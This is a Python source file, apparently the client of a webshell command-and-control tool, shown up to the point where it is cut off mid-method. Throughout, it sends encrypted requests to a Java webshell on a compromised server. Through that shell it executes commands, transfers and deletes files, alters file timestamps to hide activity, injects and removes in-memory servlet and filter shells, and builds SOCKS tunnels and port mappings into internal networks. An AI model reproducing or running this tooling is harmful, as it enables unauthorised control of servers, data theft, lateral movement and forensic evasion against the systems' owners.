import hashlib
import random
import string
from flask import json
import requests
from urllib.parse import quote
import base64
from ..encryptPayload import encryptPayload
from .javaPayload import javaPayload
from ..custom_request import CustomRequestBuilder
from ..ReqParameter import ReqParameter
import base64
import time
import datetime
from ..base_shell import BaseShell
from typing import Optional, Union, List, Dict
import gzip

class JavaShell(BaseShell):
    def __init__(self, url: str, param_name: str, secret_key: str):
        # 调用父类构造函数
        super().__init__(url, param_name, secret_key)
        
        # 将secret_key转换为16字节的md5
        md5_key = hashlib.md5(secret_key.encode()).hexdigest()
        self.secret_key = md5_key[:16]  # 保持为字符串，供标记生成使用
        self.secret_key_bytes = self.secret_key.encode()  # 字节版本供AES加密使用 
        
        self.encryptPayload = encryptPayload(self.secret_key_bytes)

        # 创建session对象以保持cookie连续性
        self.session = requests.Session()
        self.session.verify = False

        self.session.proxies = None
        self.system_info = None
        

        self.payload_manager = javaPayload()
        self.response_encrypt_type = 'aes_base64'  # 默认加密类型
        self.request_format = 'form'  # 默认请求格式
        self.request_format_file = None
        self.json_template = None

        self.cookie_name = "X-Request-ID"
        self.request_cookie = self._generate_random_cookie(32)
        
        

    def _xor_encrypt(self, data: bytes, key: bytes) -> bytes:
        """简单的XOR加密，用于加密初始payload（第一阶段加载密钥）"""
        encrypted = bytearray()
        for i in range(len(data)):
            encrypted.append(data[i] ^ key[i % len(key)])
        return bytes(encrypted)

    def _generate_random_cookie(self, length: int = 32) -> str:
        """生成随机cookie值"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def _extract_session_cookies(self, response):
        """从响应中提取会话cookie"""
        try:
            # 检查Set-Cookie响应头
            if 'Set-Cookie' in response.headers:
                print(f"[DEBUG] 服务端返回的Set-Cookie: {response.headers['Set-Cookie']}")
            
            # 检查会话cookies是否已被自动设置
            for cookie_name, cookie_value in self.session.cookies.items():
                if 'SESSION' in cookie_name.upper() or cookie_name == 'JSESSIONID':
                    print(f"[DEBUG] 会话cookie已设置: {cookie_name}={cookie_value}")
                    return cookie_value
            
            return None
        except Exception as e:
            print(f"[DEBUG] 提取会话cookie时出错: {e}")
            return None

    def send_http_request(self, encrypted_data, is_init_request=False):
        """
        发送HTTP请求 - 支持多种自定义格式
        :param encrypted_data: 加密的数据（可能已包含请求标记）
        :param is_init_request: 是否是初始化请求，初始化请求不进行重试逻辑
        :return: 响应内容
        """
        try:

            # 初始化自定义请求构建器
            self.custom_request_builder = CustomRequestBuilder(
                secret_key=self.secret_key, 
                param_name=self.param_name,
                config_file=self.request_format_file
            )
            
            # 如果不是初始化请求，使用标记定位法
            if not is_init_request:
                request_data, content_type = self.custom_request_builder.create_request_body(
                    encrypted_data=encrypted_data,
                    request_format=self.request_format
                )
            else:
                request_data, content_type = self.custom_request_builder.create_request_body(
                    encrypted_data=encrypted_data,
                    request_format="form"
                )
            headers = self.session.headers.copy()
            headers['Content-Type'] = content_type       
            self.session.cookies.set(self.cookie_name, self.request_cookie)

            response = self.session.post(
                self.url, 
                data=request_data,
                proxies=self.session.proxies,
                allow_redirects=False,
                headers=headers
            )
            
            if response.status_code == 200:
                return response
            elif response.status_code == 500:
                print(f"[DEBUG] 响应状态码为500，可能是初始化的Payload失效了，需要重新初始化，请点击请空缓存按钮")
                return None
            else:
                print(f"[DEBUG] 响应状态码为{response.status_code}，发送请求失败")
                return None
            
            
        except Exception as e:
            print(f"HTTP请求失败: {e}")
            return None
    
    def parse_system_info(self, info_text):
        """解析系统信息文本为字典"""
        try:
            system_info = {}
            
            # 按行分割
            lines = info_text.strip().split('\n')
            
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                
                # 使用 ' : ' 分割键值对
                if ' : ' in line:
                    key, value = line.split(' : ', 1)  # 只分割第一个匹配项
                    system_info[key.strip()] = value.strip()
                else:
                    # 如果没有找到标准分隔符，可能是多行值的继续
                    # 或者异常情况，跳过
                    continue
            
            return system_info
            
        except Exception as e:
            print(f"[ERROR] 解析系统信息失败: {e}")
            return {}
    
    def get_basic_info(self) -> Optional[Dict[str, str]]:
        """获取基本信息"""
        try:
            print("[DEBUG] 开始获取目标系统基本信息...")
            
            # 创建参数对象
            parameter = ReqParameter()
            
            # 调用evalFunc方法
            result_bytes = self.eval_func(None, "getBasicsInfo", parameter)
            
            if result_bytes is None or len(result_bytes) == 0:
                print("Error: evalFunc returned None or empty")
                return None
            
            # 解码为字符串
            result_text = result_bytes.decode('utf-8', errors='ignore')
            #print(f"[DEBUG] 原始响应长度: {len(result_text)} 字符")
            #print(f"[DEBUG] 响应前200字符: {result_text[:200]}")
            
            self.system_info = self.parse_system_info(result_text)
            
            if self.system_info:
                print(f"[DEBUG] 成功解析 {len(self.system_info)} 个系统信息字段")
                #self.print_system_info(self.system_info)
                return self.system_info
            else:
                print("[DEBUG] 系统信息解析失败")
                return None
            
        except Exception as e:
            print(f"Error in get_basic_info(): {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def get_CurrentDir(self):
        """获取当前目录"""
        current_dir = self.system_info.get("CurrentDir").replace("\\", "/")
        if current_dir:
            return current_dir
        else:
            return None
        
    def execute_command(self, command: str) -> Optional[str]:
        """实现BaseShell的抽象方法"""
        parameter = ReqParameter()
        parameter.add("cmdLine", command)
        result_bytes = self.eval_func(None, "execCommand", parameter)
        if result_bytes is None:
            return None
        result = result_bytes.decode('utf-8', errors='ignore')
        print(f"[DEBUG] 执行命令: {command} 结果: {result}")
        return result
    
    def execCommand(self, command: str) -> Optional[str]:
        """保持向后兼容的方法"""
        return self.execute_command(command)
    
    def get_files(self, path: Optional[str] = None) -> Optional[str]:
        if path is None:
            print("[DEBUG] get_files的参数路径为空，默认为当前目录")
            path = self.get_CurrentDir()
        parameter = ReqParameter()
        parameter.add("dirName", path)
        result_bytes = self.eval_func(None, "getFile", parameter)
        if "ok" not in result_bytes.decode('utf-8', errors='ignore'):
            print(f"[DEBUG] 获取文件失败: {result_bytes.decode('utf-8', errors='ignore')}")
            return None
        return result_bytes.decode('utf-8', errors='ignore').split("ok")[1]

    # 上传文件
    def upload_file(self, file_path: str, file_data: bytes) -> bool:
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        parameter.add("fileValue", file_data)
        result_bytes = self.eval_func(None, "uploadFile", parameter)
        if "ok" not in result_bytes.decode('utf-8', errors='ignore'):
            print(f"[DEBUG] 获取文件失败: {result_bytes.decode('utf-8', errors='ignore')}")
            return False
        return True

    def copy_file(self, src_path: str, dest_path: str) -> bool:
        parameter = ReqParameter()
        parameter.add("srcFileName", src_path)
        parameter.add("destFileName", dest_path)
        result_bytes = self.eval_func(None, "copyFile", parameter)
        if "ok" not in result_bytes.decode('utf-8', errors='ignore'):
            print(f"[DEBUG] 复制文件失败: {result_bytes.decode('utf-8', errors='ignore')}")
            return False
        return True

    def delete_file(self, file_path: str) -> bool:
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        result_bytes = self.eval_func(None, "deleteFile", parameter)
        if "ok" not in result_bytes.decode('utf-8', errors='ignore'):
            print(f"[DEBUG] 删除文件失败: {result_bytes.decode('utf-8', errors='ignore')}")
            return False
        return True
    
    def new_file(self, file_path: str) -> bool:
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        result_bytes = self.eval_func(None, "newFile", parameter)
        if "ok" not in result_bytes.decode('utf-8', errors='ignore'):
            return False
        return True
    
    def new_dir(self, dir_path: str) -> bool:
        parameter = ReqParameter()
        parameter.add("dirName", dir_path)
        result_bytes = self.eval_func(None, "newDir", parameter)
        if "ok" not in result_bytes.decode('utf-8', errors='ignore'):
            return False
        return True
        
        # 下载文件，如果文件不存在，则返回None，否则返回文件内容
    
    def download_file(self, file_path: str) -> Optional[Union[str, bytes]]:
        print(f"[DEBUG] 下载文件: {file_path}")
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        result_bytes = self.eval_func(None, "readFile", parameter)
        
        if result_bytes is None:
            print(f"[DEBUG] eval_func返回None")
            return None
        
        print(f"[DEBUG] 下载文件原始结果长度: {len(result_bytes)} bytes")
        
        # 首先检查结果是否为空
        if len(result_bytes) == 0:
            print(f"[DEBUG] 文件内容为空: {file_path}")
            return "文件内容为空"
        
        # 尝试解码为UTF-8来检查是否是错误信息
        # 只对前1024字节进行检查，避免大文件的性能问题
        check_bytes = result_bytes[:1024] if len(result_bytes) > 1024 else result_bytes
        
        try:
            # 尝试解码前面的字节来检查错误信息
            check_text = check_bytes.decode('utf-8', errors='strict')
            print(f"[DEBUG] 前1024字节UTF-8解码成功，内容: {check_text[:100]}")
            
            # 检查是否包含错误信息（只在能完全解码为UTF-8的情况下检查）
            if ('file does not exist' in check_text.lower() or 
                'permission denied' in check_text.lower() or 
                'no such file' in check_text.lower()):
                
                # 如果是错误信息，返回完整的错误文本
                full_text = result_bytes.decode('utf-8', errors='ignore')
                print(f"[DEBUG] 检测到错误信息: {file_path}")
                return full_text
                
        except UnicodeDecodeError:
            # 如果不能完全解码为UTF-8，说明这是二进制文件，直接返回字节数据
            print(f"[DEBUG] 检测到二进制文件: {file_path}, 大小: {len(result_bytes)} bytes")
            return result_bytes
        
        # 对于能完全解码为UTF-8的文件（文本文件），返回解码后的字符串
        result_text = result_bytes.decode('utf-8', errors='ignore')
        print(f"[DEBUG] 文本文件下载成功: {file_path}, 内容长度: {len(result_text)} 字符")
        return result_text
    
    def move_file(self, src_path: str, dest_path: str) -> bool:
        parameter = ReqParameter()
        parameter.add("srcFileName", src_path)
        parameter.add("destFileName", dest_path)
        result_bytes = self.eval_func(None, "moveFile", parameter)
        if "ok" not in result_bytes.decode('utf-8', errors='ignore'):
            print(f"[DEBUG] 移动文件失败: {result_bytes.decode('utf-8', errors='ignore')}")
            return False
        return True

    def big_file_upload(self, file_path: str, file_data: bytes, position: str = "0") -> bool:
        parameter = ReqParameter()
        parameter.add("fileContents", file_data)
        parameter.add("fileName", file_path)
        parameter.add("position", position)
        result_bytes = self.eval_func(None, "bigFileUpload", parameter)
        if "ok" not in result_bytes.decode('utf-8', errors='ignore'):
            print(f"[DEBUG] 上传大文件失败: {result_bytes.decode('utf-8', errors='ignore')}")
            return False
        return True

    def get_file_size(self, filename):
        """获取文件大小"""
        parameter = ReqParameter()
        parameter.add("fileName", filename)
        result_bytes = self.eval_func(None, "getFileSize", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        print(f"[DEBUG] 获取文件大小: {filename} 结果: {result_text}")
        
        # 尝试解析为数字
        try:
            file_size = int(result_text.strip())
            return file_size
        except ValueError:
            print(f"[ERROR] 无法解析文件大小: {result_text}")
            return None

    def read_file_by_position(self, filename, position, read_byte_num):
        """按位置读取文件数据块"""
        parameter = ReqParameter()
        parameter.add("fileName", filename)
        parameter.add("position", str(position))
        parameter.add("readByteNum", str(read_byte_num))
        result_bytes = self.eval_func(None, "readFileByPosition", parameter)
        print(f"[DEBUG] 读取文件块: {filename} 位置: {position} 大小: {read_byte_num} 结果长度: {len(result_bytes)}")
        return result_bytes

    def big_file_download(self, file_path: str, save_path: Optional[str] = None, chunk_kb_size: Optional[int] = None, timeout: float = 0, enable_chunk_size_variation: bool = False, chunk_size_variation_kb: int = 128) -> bool:
        """
        大文件下载实现
        
        Args:
            filename: 服务器上要下载的文件路径
            save_path: 本地保存路径，如果为None则使用原文件名
            chunk_kb_size: 以kb为单位，每次读取的块大小，如果为None则动态计算
            timeout: 每次读取块之间的延迟时间，单位为秒，默认0秒
            enable_chunk_size_variation: 是否启用块大小浮动，默认False
            chunk_size_variation_kb: 块大小浮动范围（KB），默认128KB
        
        Returns:
            bool: 下载是否成功
        """
        try:
            print(f"[INFO] 开始下载大文件: {file_path}")
            
            # 1. 获取文件大小
            file_size = self.get_file_size(file_path)
            if file_size is None:
                print(f"[ERROR] 无法获取文件大小")
                return False
            
            print(f"[INFO] 文件大小: {file_size} 字节")
            
            # 2. 如果未提供块大小，则根据文件大小动态设置
            if chunk_kb_size is None:
                if file_size < 1 * 1024 * 1024:  # < 1MB
                    chunk_kb_size = 64  # 64KB chunks
                elif file_size < 100 * 1024 * 1024: # < 100MB
                    chunk_kb_size = 512 # 512KB chunks
                else: # >= 100MB
                    chunk_kb_size = 1024 * 4 # 4MB chunks
                print(f"[INFO] 未指定块大小，根据文件大小自动设置为: {chunk_kb_size} KB")

            # 3. 确定保存路径和初始化变量
            if save_path is None:
                import os
                save_path = os.path.basename(file_path)
            
            base_chunk_size = chunk_kb_size * 1024
            
            # 打印块浮动配置信息
            if enable_chunk_size_variation:
                variation_bytes = chunk_size_variation_kb * 1024
                min_chunk_size = max(1024, base_chunk_size - variation_bytes)  # 最小1KB
                max_chunk_size = base_chunk_size + variation_bytes
                print(f"[INFO] 启用块大小浮动: 基础块大小 {chunk_kb_size}KB, 浮动范围 ±{chunk_size_variation_kb}KB")
                print(f"[INFO] 实际块大小范围: {min_chunk_size//1024}KB - {max_chunk_size//1024}KB")
            else:
                print(f"[INFO] 固定块大小: {chunk_kb_size}KB")
            
            # 4. 分块下载
            downloaded_data = b""
            position = 0
            chunk_index = 0
            
            while position < file_size:
                chunk_index += 1
                
                # 计算当前块的大小
                if enable_chunk_size_variation:
                    # 生成随机浮动的块大小
                    import random
                    variation_bytes = chunk_size_variation_kb * 1024
                    min_chunk_size = max(1024, base_chunk_size - variation_bytes)  # 最小1KB
                    max_chunk_size = base_chunk_size + variation_bytes
                    current_chunk_size = random.randint(min_chunk_size, max_chunk_size)
                else:
                    current_chunk_size = base_chunk_size
                
                # 确保不超出文件边界
                remaining_bytes = file_size - position
                actual_chunk_size = min(current_chunk_size, remaining_bytes)
                
                # 显示下载进度
                progress_percent = (position / file_size) * 100
                if enable_chunk_size_variation:
                    print(f"[INFO] 下载进度: 块{chunk_index} ({position}/{file_size}, {progress_percent:.1f}%) - 块大小: {actual_chunk_size//1024}KB")
                else:
                    print(f"[INFO] 下载进度: 块{chunk_index} ({position}/{file_size}, {progress_percent:.1f}%)")
                
                # 读取当前块
                chunk_data = self.read_file_by_position(file_path, position, actual_chunk_size)
                
                if len(chunk_data) == 0:
                    print(f"[ERROR] 读取块 {chunk_index} 失败，数据为空")
                    return False
                
                downloaded_data += chunk_data
                
                # 检查是否读取了预期的字节数
                if len(chunk_data) != actual_chunk_size:
                    print(f"[WARNING] 块 {chunk_index} 实际读取 {len(chunk_data)} 字节，期望 {actual_chunk_size} 字节")
                
                # 更新位置
                position += len(chunk_data)
                
                # 如果启用了延迟，则等待
                if timeout > 0:
                    time.sleep(timeout)
            # 5. 保存到本地文件
            try:
                with open(save_path, 'wb') as f:
                    f.write(downloaded_data)
                print(f"[SUCCESS] 文件下载完成: {save_path}")
                print(f"[INFO] 下载文件大小: {len(downloaded_data)} 字节")
                return True
            except Exception as save_error:
                print(f"[ERROR] 保存文件失败: {save_error}")
                return False
                
        except Exception as e:
            print(f"[ERROR] 大文件下载失败: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def zip(self, compress_paths: Union[str, List[str]], compress_file: str, **kwargs) -> bool:
        """
        压缩文件或目录
        :param compress_paths: 要压缩的路径，可以是字符串（单个路径）或列表（多个路径）
        :param compress_file_path: 压缩后的文件路径
        :param class_name: 加载进内存的Java类名
        :return: 压缩结果
        """
        # 从 kwargs 中获取 class_name，默认为 "JZip"
        class_name = kwargs.get('class_name', 'JZip')
        
        # 处理输入参数：支持单个路径或多个路径
        if isinstance(compress_paths, str):
            # 单个路径，直接使用
            paths_str = compress_paths
        elif isinstance(compress_paths, (list, tuple)):
            # 多个路径，用 "|" 连接
            paths_str = "|".join(str(path) for path in compress_paths)
        else:
            raise ValueError("compress_paths 必须是字符串或列表")
        
        parameter = ReqParameter()
        parameter.add("compressDir", paths_str)
        parameter.add("compressFile", compress_file)

        result_bytes = self.eval_func(class_name, "zip", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "evalClass is null" in result_text:
            print(f"[DEBUG] JZip类未加载")
            classinfo = {"original_classname":"JZip","obfuscation_name":class_name}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(class_name, "zip", parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 压缩文件失败: {result_text}")
            return False
        
        print(f"[DEBUG] 压缩成功: {result_text}")
        return True

    def unzip(self, compress_file: str, extract_dir: str, **kwargs) -> bool:
        """
        解压文件
        :param compress_file: 压缩文件路径
        :param compress_dir: 解压目录
        :param class_name: 使用的Java类名
        :return: 解压结果
        """
        # 从 kwargs 中获取 class_name，默认为 "JZip"
        class_name = kwargs.get('class_name', 'JZip')
        
        parameter = ReqParameter()
        parameter.add("compressFile", compress_file)
        parameter.add("compressDir", extract_dir) 
        result_bytes = self.eval_func(class_name, "unZip", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "evalClass is null" in result_text:
            print(f"[DEBUG] JZip类未加载")
            classinfo = {"original_classname":"JZip","obfuscation_name":class_name}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(class_name, "unZip", parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 解压文件失败: {result_text}")
            return False
        print(f"[DEBUG] 解压成功: {result_text}")
        return True
    
    def file_remote_download(self, download_url: str, save_path: str) -> bool:
        """实现BaseShell的抽象方法"""
        return self.fileRemoteDownload(download_url, save_path)
    
    def fileRemoteDownload(self, url: str, save_file: str) -> bool:
        """保持向后兼容的方法"""
        parameter = ReqParameter()
        parameter.add("url", url)
        parameter.add("saveFile", save_file)
        result_bytes = self.eval_func(None, "fileRemoteDownload", parameter)
        if "ok" not in result_bytes.decode('utf-8', errors='ignore'):
            print(f"[DEBUG] 下载文件失败: {result_bytes.decode('utf-8', errors='ignore')}")
            return False
        print(f"[DEBUG] 下载文件成功: {result_bytes.decode('utf-8', errors='ignore')}")
        return True

    def set_file_permission(self, file_path: str, permission: str) -> bool:
        parameter = ReqParameter()
        parameter.add("fileName", file_path)
        parameter.add("type", "fileBasicAttr")
        parameter.add("attr", permission)
        result_bytes = self.eval_func(None, "setFileAttr", parameter)
        if "ok" not in result_bytes.decode('utf-8', errors='ignore'):
            print(f"[DEBUG] 设置文件属性失败: {result_bytes.decode('utf-8', errors='ignore')}")
            return False
        print(f"[DEBUG] 设置文件属性成功: {result_bytes.decode('utf-8', errors='ignore')}")
        return True
    
    def set_file_time(self, file_path: str, time_list: List[str]) -> bool:
        """
        设置文件时间属性
        :param fileName: 文件路径
        :param time: 时间列表：[修改时间, 访问时间]，使用"none"表示不修改该属性
        :return: 操作结果
        """
        parameter = ReqParameter()
        
        # 只接受列表参数
        if not isinstance(time_list, (list, tuple)):
            raise ValueError("time_list 参数必须是列表：[修改时间, 访问时间]")
        
        if len(time_list) != 2:
            raise ValueError("时间列表必须包含2个元素：[修改时间, 访问时间]")
        
        time_parts = []
        for t in time_list:
            if t is None or t == "none" or str(t).lower() == "none":
                time_parts.append("none")
            else:
                # 转换时间字符串为时间戳
                dt_object = datetime.datetime.strptime(str(t), "%Y-%m-%d %H:%M:%S")
                sec_timestamp = dt_object.timestamp()
                sec_timestamp_str = str(int(sec_timestamp))
                time_parts.append(sec_timestamp_str)
        
        # 用 "|" 连接时间戳
        time_attr = "|".join(time_parts)

        parameter.add("fileName", file_path)
        parameter.add("attr", time_attr)
        parameter.add("type", "fileTimeAttr")
        result_bytes = self.eval_func(None, "setFileAttr", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 设置文件时间失败: {result_text}")
            return False
        print(f"[DEBUG] 设置文件时间成功: {result_text}")
        return True
    

    def load_memory_shell(self,param,secretKey,path,cookie_name=None,className="AES_BASE64"):
        parameter = ReqParameter()
        md5_secretKey = hashlib.md5(secretKey.encode()).hexdigest()
        parameter.add("param", param)
        parameter.add("secretKey", md5_secretKey[:16])
        parameter.add("path", path)
        parameter.add("ck_name", cookie_name)
        result_bytes = self.eval_func(className, "run", parameter)
        if "ok" not in result_bytes.decode('utf-8', errors='ignore'):
            print(f"[DEBUG] 加载内存Shell失败: {result_bytes.decode('utf-8', errors='ignore')}")
            return False,result_bytes.decode('utf-8', errors='ignore')
        component_name = result_bytes.decode('utf-8', errors='ignore').split("|")[1].strip()
        print(f"[DEBUG] 加载内存Shell成功: {component_name}")
        return True,component_name

    def unload_memory_shell(self,urlPattern,componentName,className="MemoryShellManage",method="servlet"):
        """
        卸载内存Shell
        :param urlPattern: 内存马的URL路径
        :param componentName: 内存马的组件名称（servlet名或filter名）
        :param className: 使用的Java类名
        :param method: 内存马类型（servlet或filter）
        :return: 卸载结果
        """
        parameter = ReqParameter()
        if method == "servlet":
            parameter.add("methodName", "unLoadServlet")
            parameter.add("urlPattern", urlPattern)
            parameter.add("wrapperName", componentName)
        elif method == "filter":
            parameter.add("methodName", "unFilter")
            parameter.add("filterName", componentName)
        
        result_bytes = self.eval_func(className, None, parameter)
        result_str = result_bytes.decode('utf-8', errors='ignore')
        if "evalClass is null" in result_str:
            print(f"[DEBUG] MemoryShellManage类未加载")
            classinfo = {"original_classname":"MemoryShellManage","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(className, None, parameter)
            result_str = result_bytes.decode('utf-8', errors='ignore')
        if "ok" not in result_str:
            print(f"[DEBUG] 卸载内存Shell失败: {result_str}")
            return False, result_str
        print(f"[DEBUG] 卸载内存Shell成功: {result_str}")
        return True, result_str

    def get_shell_info(self,className="MemoryShellManage"):
        """
        获取所有内存马信息（包括Servlet和Filter）
        :param className: 使用的Java类名
        :return: 获取所有内存马信息结果
        """
        parameter = ReqParameter()
        parameter.add("methodName", "getShellInfo")
        result_bytes = self.eval_func(className, None, parameter)
        result_str = result_bytes.decode('utf-8', errors='ignore')
        if "evalClass is null" in result_str:
            print(f"[DEBUG] MemoryShellManage类未加载")
            classinfo = {"original_classname":"MemoryShellManage","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_str = self.eval_func(className, None, parameter).decode('utf-8', errors='ignore')
        if "SERVLETS" not in result_str and "FILTERS" not in result_str:
            print(f"[DEBUG] 获取所有内存马信息失败: {result_str}")
            return None
        print(f"[DEBUG] 获取所有内存马信息成功: \n{result_str}")
        return result_str
    
    def get_all_filter(self,className="FilterManage"):
        """
        获取所有Filter
        :param className: 使用的Java类名
        :return: 获取所有Filter结果
        """
        parameter = ReqParameter()
        result_bytes = self.eval_func(className, "getAllFilter", parameter)
        result_str = result_bytes.decode('utf-8', errors='ignore')
        if "evalClass is null" in result_str:
            print(f"[DEBUG] FilterManage类未加载")
            classinfo = {"original_classname":"FilterManage","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(className, "getAllFilter", parameter)
            result_str = result_bytes.decode('utf-8', errors='ignore')
        if "filtersInfo" not in result_str:
            print(f"[DEBUG] 获取所有Filter失败: {result_str}")
            return None
        print(f"[DEBUG] 获取所有Filter成功: {result_str}")
        return result_str

    def create_tunnel(self, targetIP, targetPort, socketHash, className="SocksProxy"):
        parameter = ReqParameter()
        parameter.add("targetIP", targetIP)
        parameter.add("targetPort", targetPort)
        parameter.add("socketHash", socketHash)
        result_bytes = self.eval_func(className, "createTunnel", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "evalClass is null" in result_text:
            print(f"[DEBUG] SocksProxy类未加载")
            classinfo = {"original_classname":"SocksProxy","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(className, "createTunnel", parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 创建隧道失败: {result_text}")
            return False
        print(f"[DEBUG] 创建隧道成功: {targetIP}:{targetPort}, socketHash: {socketHash}")
        return True
    
    def doWrite(self, socketHash, data, className="SocksProxy"):
        parameter = ReqParameter()
        parameter.add("socketHash", socketHash)
        parameter.add("extraData", base64.b64encode(data).decode('utf-8'))
        result_bytes = self.eval_func(className, "doWrite", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "evalClass is null" in result_text:
            print(f"[DEBUG] SocksProxy类未加载")
            classinfo = {"original_classname":"SocksProxy","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(className, "doWrite", parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 写入数据失败: {result_text}")
            return False
        print(f"[DEBUG] 写入数据成功: socketHash: {socketHash}, 数据长度: {len(data)}")
        return True
    
    def doRead(self, socketHash, className="SocksProxy"):
        parameter = ReqParameter()
        parameter.add("socketHash", socketHash)
        result_bytes = self.eval_func(className, "doRead", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        # 检查类是否失效
        if "evalClass is null" in result_text:
            print(f"[DEBUG] SocksProxy类未加载")
            classinfo = {"original_classname":"SocksProxy","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(className, "doRead", parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        # 添加调试信息
        print(f"[DEBUG] doRead解密后内容: {repr(result_text)}")
        
        # 检查是否有错误
        if "error:" in result_text:
            error_msg = result_text.replace("error:", "").strip()
            print(f"[DEBUG] 读取数据失败: {error_msg}")
            
            # 如果是连接不存在的错误，这是正常的（连接可能已关闭）
            if "Socket connection not found" in error_msg or "socketChanel closed" in error_msg:
                print(f"[DEBUG] 连接已关闭: {socketHash}")
                return None
            else:
                print(f"[DEBUG] 其他读取错误: {error_msg}")
                return None
            
        if "ok" not in result_text:
            print(f"[DEBUG] 读取数据失败: {result_text}")
            return None
        
        # 提取ok后面的base64数据
        if result_text.startswith("ok"):
            base64_data = result_text[2:]  # 去掉"ok"前缀
            if base64_data:
                try:
                    decoded_data = base64.b64decode(base64_data)
                    print(f"[DEBUG] 读取数据成功: socketHash: {socketHash}, 数据长度: {len(decoded_data)}")
                    return decoded_data
                except Exception as e:
                    print(f"[DEBUG] Base64解码失败: {e}")
                    return b""
            else:
                # 没有数据，但连接正常
                return b""
        return None

    def doClear(self, className="SocksProxy"):
        parameter = ReqParameter()
        parameter.add("methodName", "doClear")
        result_bytes = self.eval_func(className, None, parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "evalClass is null" in result_text:
            print(f"[DEBUG] SocksProxy类未加载")
            classinfo = {"original_classname":"SocksProxy","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(className, None, parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 清除所有隧道失败: {result_text}")
            return False
        print(f"[DEBUG] 清除所有隧道成功: {result_text}")
        return True

    # ================== 端口映射方法 ==================

    def create_port_mapping(self, mapping_id, target_ip, target_port, className="PortMapping"):
        """
        创建端口映射
        :param mapping_id: 映射标识符
        :param target_ip: 内网目标IP
        :param target_port: 内网目标端口
        :param className: 使用的Java类名
        :return: 创建结果
        """
        parameter = ReqParameter()
        parameter.add("methodName", "createMapping")
        parameter.add("mappingId", mapping_id)
        parameter.add("targetIP", target_ip)
        parameter.add("targetPort", target_port)
        result_bytes = self.eval_func(className, "createMapping", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "evalClass is null" in result_text:
            print(f"[DEBUG] PortMapping类未加载")
            classinfo = {"original_classname":"PortMapping","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(className, "createMapping", parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 创建端口映射失败: {result_text}")
            return False
        print(f"[DEBUG] 创建端口映射成功: {mapping_id} -> {target_ip}:{target_port}")
        return True

    def close_port_mapping(self, mapping_id, className="PortMapping"):
        """
        关闭端口映射
        :param mapping_id: 映射标识符
        :param className: 使用的Java类名
        :return: 关闭结果
        """
        parameter = ReqParameter()
        parameter.add("methodName", "closeMapping")
        parameter.add("mappingId", mapping_id)
        result_bytes = self.eval_func(className, "closeMapping", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "evalClass is null" in result_text:
            print(f"[DEBUG] PortMapping类未加载")
            classinfo = {"original_classname":"PortMapping","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(className, "closeMapping", parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 关闭端口映射失败: {result_text}")
            return False
        print(f"[DEBUG] 关闭端口映射成功: {mapping_id}")
        return True

    def forward_to_mapping(self, mapping_id, data, className="PortMapping"):
        """
        转发数据到映射目标
        :param mapping_id: 映射标识符
        :param data: 要转发的数据
        :param className: 使用的Java类名
        :return: 转发结果
        """
        parameter = ReqParameter()
        parameter.add("methodName", "forwardData")
        parameter.add("mappingId", mapping_id)
        parameter.add("extraData", base64.b64encode(data).decode('utf-8'))
        result_bytes = self.eval_func(className, "forwardData", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "evalClass is null" in result_text:
            print(f"[DEBUG] PortMapping类未加载")
            classinfo = {"original_classname":"PortMapping","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(className, "forwardData", parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 转发到映射失败: {result_text}")
            return False
        print(f"[DEBUG] 转发到映射成功: {mapping_id}, 数据长度: {len(data)}")
        return True

    def read_from_mapping(self, mapping_id, className="PortMapping"):
        """
        从映射目标读取数据 - 优化版（支持自适应轮询）
        :param mapping_id: 映射标识符
        :param className: 使用的Java类名
        :return: 读取的数据或None（连接关闭）
        """
